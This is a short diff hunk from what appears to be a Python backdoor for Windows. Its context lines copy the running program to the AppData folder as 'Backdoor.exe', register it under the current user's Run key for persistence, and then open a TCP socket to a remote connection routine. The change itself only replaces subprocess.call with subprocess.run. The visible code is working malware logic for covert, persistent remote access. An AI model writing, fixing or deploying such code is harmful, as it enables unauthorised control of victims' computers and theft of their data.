@@ -57,7 +57,7 @@ location = os.environ["APPDATA"] + "\\Backdoor.exe"
 if not os.path.exists(location):
         shutil.copyfile(sys.executable, location)
         reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "{location}" /f '
-        subprocess.call(reg_command, shell=True, capture_output=True, text=True)
+        subprocess.run(reg_command, shell=True, capture_output=True, text=True)
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection()
